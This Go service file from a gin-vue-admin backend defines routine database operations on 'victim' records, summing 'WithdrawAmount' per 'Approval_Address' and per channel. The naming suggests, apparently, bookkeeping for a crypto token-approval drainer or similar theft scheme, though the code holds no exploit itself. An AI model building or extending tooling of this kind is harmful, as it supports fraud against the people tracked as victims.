package system

import (
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model/system"
	"strconv"
)

//@author: [piexlmax](https://github.com/piexlmax)
//@function: CreateVictimTx
//@description: 新增基础tx
//@param: tx model.SysVictimTx
//@return: err error

type VictimTxService struct{}

func (VictimTxService *VictimTxService) CreateVictimTx(tx system.SysVictimTx) (err error) {

	return global.GVA_DB.Create(&tx).Error
}

func (VictimTxService *VictimTxService) GetVictimTxById(id int) (tx system.SysVictimTx, err error) {
	err = global.GVA_DB.Where("id = ?", id).First(&tx).Error
	return
}

func (VictimTxService *VictimTxService) UpdateVictimTx(tx system.SysVictimTx) (err error) {
	var oldA system.SysVictimTx
	err = global.GVA_DB.Where("id = ?", tx.ID).First(&oldA).Error
	if err != nil {
		return err
	} else {

		err = global.GVA_DB.Save(&tx).Error
	}

	return err
}
func (VictimTxService *VictimTxService) QueryUniqueChannel() ([]string, error) {
	var records []string
	err := global.GVA_DB.Model(&system.SysVictim{}).Distinct("primary_channel").Where("status = ?", 1).Find(&records).Error
	return records, err
}
func (VictimTxService *VictimTxService) QueryUniqueAddress() ([]string, error) {
	var records []string
	err := global.GVA_DB.Model(&system.SysVictim{}).Distinct("Approval_Address").Where("status = ?", 1).Find(&records).Error
	return records, err
}

func (VictimTxService *VictimTxService) StatByApprovalAddress(tx string) (float64, error) {
	var recordTxs []system.SysVictim
	err := global.GVA_DB.Model(&system.SysVictim{}).Where("Approval_Address = ?", tx).Find(&recordTxs).Error
	var totalAmount float64
	if err != nil {
		return totalAmount, err
	} else {

		for _, record := range recordTxs {
			amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
			if err == nil {
				totalAmount = totalAmount + amount
			}
		}
	}
	return totalAmount, err
}
func (VictimTxService *VictimTxService) StatByChannel(txChannel string) (float64, error) {
	var recordTxs []system.SysVictim
	err := global.GVA_DB.Model(&system.SysVictim{}).Where("primary_channel = ?", txChannel).Find(&recordTxs).Error
	var totalAmount float64
	if err != nil {
		return totalAmount, err
	} else {

		for _, record := range recordTxs {
			amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
			if err == nil {
				totalAmount = totalAmount + amount
			}
		}
	}
	return totalAmount, err
}
